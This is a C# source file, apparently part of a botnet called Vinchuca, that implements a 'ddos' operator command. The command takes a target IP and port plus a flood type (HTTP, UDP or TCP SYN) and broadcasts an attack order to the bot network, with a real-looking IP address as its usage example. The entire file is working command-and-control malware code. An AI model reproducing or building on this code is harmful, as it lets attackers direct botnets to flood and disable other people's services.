using System;
using System.Collections.Generic;
using System.Net;
using Mono.Options;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Messages.Command;

namespace Vinchuca.REPL
{
    class DDoSCommand : Command
    {
        private readonly Agent _agent;

        public bool ShowHelp { get; set; }
        public string Target { get; set; }
        public string Type { get; set; }

        public DDoSCommand(Agent agent)
            : base("ddos", "Perform DDOS attack against specified target.")
        {
            _agent = agent;
            Options = new OptionSet() {
            "usage: ddos --type:attack-type --bot:bot-identifier",
            "",
            "Performs a DDoS attack against the specified target ip:port endpoint.",
            "eg: ddos --type:httpflood --target:212.54.13.87:80",
            { "type=",   "{type} of attack [httpflood | udpflood | tcpsynflood].", x => Type = x },
            { "target=", "{target} to attack (ipaddress:port endpoint)", x => Target = x },
            { "help|h|?","Show this message and exit.",
              v => ShowHelp = v != null },
        };
        }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (string.IsNullOrEmpty(Target))
                {
                    Console.Error.WriteLine("commands: Missing required argument `--target=TARGET`.");
                    Console.Error.WriteLine("commands: Use `help ddos` for details.");
                    return 1;
                }
                var endpointParts = Target.Split(new []{':'});
                var ip = endpointParts[0];
                var port = int.Parse(endpointParts[1]);
                var session = (long) Utils.RandomUtils.NextCorrelationId();
                var ddosMessage = new DosAttackMessage()
                {
                    AttackId = session,
                    Type = (DosAttackMessage.DosType) 1,
                    Threads = 4,
                    Target = new IPEndPoint(IPAddress.Parse(ip), port),
                    Buffer = new byte[0]
                };
                _agent.MessagesManager.Broadcast(ddosMessage, 6);
                Console.WriteLine("Attack sessionID {0}", session);
                Console.WriteLine("Stop it using ´stop-ddos {0}´", session);
                return 0;
            }
            catch (Exception e)
            {
//                Console.Error.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
